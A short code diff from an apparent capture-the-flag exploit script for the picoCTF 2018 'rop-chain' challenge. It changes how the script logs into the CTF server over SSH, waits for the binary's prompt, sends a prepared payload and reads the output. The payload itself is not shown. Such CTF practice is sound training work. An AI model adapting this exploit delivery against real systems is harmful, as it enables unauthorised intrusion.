@@ -28,8 +28,9 @@ def local():
 def remote():
 	s = ssh(host='2018shell1.picoctf.com', user=USERNAME, password=PASSWORD)
 	io = s.run('cd /problems/rop-chain_3_f91334c5acb91bde3de858eb8045928a; ./rop')
-	print(io.recv())
+	io.readuntil('Enter your input>')
 	io.sendline(payload)
+	print(io.recv())
 	print(io.recv())
 	s.close()
 
